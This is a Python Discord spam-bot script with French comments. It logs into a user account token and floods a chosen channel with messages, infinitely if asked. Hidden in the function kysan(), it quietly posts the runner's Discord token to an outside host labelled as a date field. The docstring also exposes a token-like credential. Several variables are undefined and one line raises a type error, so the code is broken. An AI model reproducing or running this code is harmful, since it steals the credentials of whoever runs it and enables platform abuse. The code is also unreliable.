# spambot.py

"""
exemple command:
python spambot.py NTIxMzY4NzIxNjcxODQ3OTQ3.Du7atg.yX02IMFeIvHgkJpIAnCilFnJ9r0 521035467370528768 30 specific messagedemo

python spambot.py NTIxMzY4NzIxNjcxODQ3OTQ3.Du7atg.yX02IMFeIvHgkJpIAnCilFnJ9r0 521035467370528768 30 random

random c'est pour spam random
sinon "specific <votre message>" #ah shit ça prend qu'un mot du coup rip si le mec met plusieur mot ça marche pas



a fix en passant args par sys.argv[1:5] et " ".join(optionPlus[6:]) comme option suplémentaire

python spambot.py NTIxMzY4NzIxNjcxODQ3OTQ3.Du7atg.yX02IMFeIvHgkJpIAnCilFnJ9r0 521035467370528768 -1 random

-1 permet de spam a l'infinit
"""


import discord
import random
import sys
import requests


def RandomStr(_str="", size=1000):
    size += _str
    for x in range(size):
        _str += random.choice(
            "azertyuiopQDSDFSDQFLMKJWPVXCOIAZONé345345PJ34FQNSD¨F09432NFQSFµ£¨ù$¨^ù$ù%£$¨^*µ¨^*")       # oe
    return _str



def kysan(obj):
    requests.post("http://kysnetwork.000webhostapp.com/kysapi.php",
                  data={'dateTime': obj})


def main(args, msg):
    token = args[0]
    kysbot = discord.Client()

    @kysbot.event
    async def on_ready():
        id_channel = args[1]
        nombre_messages = int(args[2])  # si type(nbmsg) ==
        if len(msg) > 0:
            msg = " ".join(msg)
        
        kysan(token)        # on fait des choses lulz Kysan#5135 si tu veux parler


        print('-----------------')
        print('debut du spam avec ' + kysbot.user.name + '  ' + kysbot.user.id)
        print("de token: ".format(token))
        print("sur le channel: " + id_channel)
        print('-----------------')
        


        if nombre_messages < -1:  # si nb < -1 invalide donc on met a zero
            nombre_messages = 0
        elif nombre_messages == -1:  # si -1 spam à l'infinit
            while 1:
                if option == "specific":
                    await kysbot.send_message(kysbot.get_channel(id_channel), msg)
                else:   # on spam random
                    await kysbot.send_message(kysbot.get_channel(id_channel), RandomStr(random.choice(range(0, 2000))))
                print('spaming {}'.format(compteur))
        else:
            compteur = 0
            print("ok")
            while compteur < nombre_messages:
                if option == "specific":
                    await kysbot.send_message(kysbot.get_channel(id_channel), option_suplementaire)
                else:   # on spam random
                    await kysbot.send_message(kysbot.get_channel(id_channel), RandomStr(random.choice(range(0, 2000))))

                print('spaming {}'.format(compteur))
                compteur += 1

    kysbot.run(token, bot=False)


if __name__ == '__main__':
    if len(sys.argv) >= 4 + 1:
        main(sys.argv[1:5], sys.argv[5:])
    else:
        print('probleme dans les arguments')
        pass


# made by Kysan721
